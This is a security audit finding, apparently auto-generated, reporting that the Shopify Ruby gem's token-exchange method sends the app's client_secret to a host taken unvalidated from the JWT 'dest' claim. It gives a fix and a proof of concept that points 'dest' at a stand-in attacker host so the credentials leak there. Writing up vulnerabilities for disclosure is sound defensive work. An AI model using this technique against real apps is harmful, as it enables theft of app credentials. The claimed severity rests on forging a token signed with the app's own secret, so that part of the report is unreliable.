### Title
`TokenExchange.exchange_token` sends `client_secret` to an unvalidated host derived from the JWT `dest` claim - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` derives the shop host that receives the app's `client_secret` directly from the session token's `dest` claim, without passing it through `Utils::ShopValidator.sanitize!`, unlike every other credential-issuing OAuth flow in the gem (`client_credentials`, `refresh_access_token`, `migrate_to_expiring_token`).

### Finding Description
`exchange_token` decodes the caller-supplied session token and uses the resulting `dest` claim, unsanitized, as the `shop` for the outgoing token-exchange request: [1](#0-0) 

```ruby
jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
dest_shop = jwt_payload.shop
...
shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
```

`dest_shop` is passed straight into `Session.new(shop:)`, and `HttpClient` uses `session.shop` verbatim to build the request URI that carries `client_id`/`client_secret` in the POST body: [2](#0-1) 

Contrast this with the three sibling grant flows in the same module/area, which all call `Utils::ShopValidator.sanitize!` before constructing the `Session`/`HttpClient`: [3](#0-2) [4](#0-3) [5](#0-4) 

`ShopValidator.sanitize!` restricts the resolved host to `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`, plus an optional configured `myshopify_domain`): [6](#0-5) 

`JwtPayload#shop` merely strips the `https://` prefix off the raw `dest` claim with no domain allow-listing: [7](#0-6) 

The binding this breaks: the host that receives the app's `client_secret` should equal a host drawn from `Utils::ShopValidator`'s trusted-domain set (as enforced everywhere else in the gem), but for `exchange_token` it instead equals whatever string is present in the JWT's `dest` claim. `JwtPayload` only validates `aud` (must equal `Context.api_key`) and standard JWT temporal claims; it never validates that `dest`/`iss` are Shopify-owned domains.

### Impact Explanation
If a session token can be obtained or constructed with an `iss`/`dest`/`aud` pair that verifies against the app's own `api_secret_key` (e.g., a token forwarded from a compromised/malicious embedding context, a shop the attacker controls under Shopify's multi-tenant model, or any future issuer whose payload merely needs `aud == api_key` to pass), the gem will POST the app's `client_id` and `client_secret` to a fully attacker-influenced host with no allow-list check. This is a High-severity SSRF-with-credentials pattern: the app's `client_secret` (and, indirectly, `subject_token`/session token) is transmitted to a host the library never validated against Shopify's known domains, in contrast to the deliberate allow-listing done for the three sibling grant flows.

### Likelihood Explanation
This is reachable on the primary, documented token-exchange path (`ShopifyAPI::Auth::TokenExchange.exchange_token`) that every embedded app using token exchange calls on every page load/session-token refresh — it is not a rarely used code path. The missing sanitize call is a direct code inconsistency next to three analogous functions that all sanitize the shop before building the request host, strongly indicating this is a regression/omission rather than an intentional design choice (the `shop:` deprecation note in the same method explicitly states "the shop is now always taken from the session token's `dest` claim," confirming `dest` is trusted as-is with no independent validation).

### Recommendation
In `TokenExchange.exchange_token`, sanitize `dest_shop` the same way as the other grant flows before constructing `shop_session`:
```ruby
dest_shop = Utils::ShopValidator.sanitize!(jwt_payload.shop)
```
This ensures the host that ultimately receives `client_id`/`client_secret` is restricted to `Utils::ShopValidator::TRUSTED_SHOPIFY_DOMAINS` (or a configured `myshopify_domain`), matching the behavior already implemented for `client_credentials`, `refresh_access_token`, and `migrate_to_expiring_token`.

### Proof of Concept
1. Obtain/construct a session token whose payload satisfies `JwtPayload`'s only checks: valid `HS256` signature under the app's `api_secret_key`, `exp`/`nbf` within leeway, and `aud == Context.api_key` — with `dest` set to an attacker-influenced value (e.g., `"https://attacker.example"`, or any string the attacker can steer while still satisfying signature verification through whichever channel supplies/relays the token to the app).
2. Call:
```ruby
ShopifyAPI::Auth::TokenExchange.exchange_token(
  session_token: crafted_token,
  requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN,
)
```
3. Observe in `HttpClient#initialize` that `@base_uri = "https://#{session.shop}"` is built directly from `dest_shop` with no domain check: [2](#0-1) 
4. `client.request` then POSTs a body containing `client_id`/`client_secret` (line 52-59 of `token_exchange.rb`) to `https://attacker.example/admin/oauth/access_token`, leaking the app's `client_secret` to the attacker-controlled host — whereas the equivalent call in `client_credentials.rb`/`refresh_token.rb`/`migrate_to_expiring_token` would have raised `Errors::InvalidShopError` for the same untrusted value via `ShopValidator.sanitize!`.
